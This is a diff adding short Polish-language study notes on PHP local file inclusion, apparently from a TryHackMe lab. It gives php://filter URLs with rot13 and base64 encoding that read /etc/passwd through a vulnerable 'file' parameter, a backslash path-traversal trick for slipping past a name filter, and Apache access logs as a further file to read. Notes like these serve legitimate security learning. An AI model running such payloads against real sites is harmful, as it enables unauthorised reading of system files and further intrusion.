@@ -1,0 +1,15 @@
+1) Odczytywanie php
+      • Przyklady url dla podatnej zmiennej get (base64 / rot13)
+            ▪ http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+            ▪ http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+            ▪ http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+          
+          
+ 2) Do ominiecia filtra np. na jakas nazwe mozna zastosowac
+ -> <jakas_nazwa>\..\index.php
+ 
+ 
+ 
+ 3) co mozna odczytac
+ -> Logi apache
+ var/log/apache2/access.log
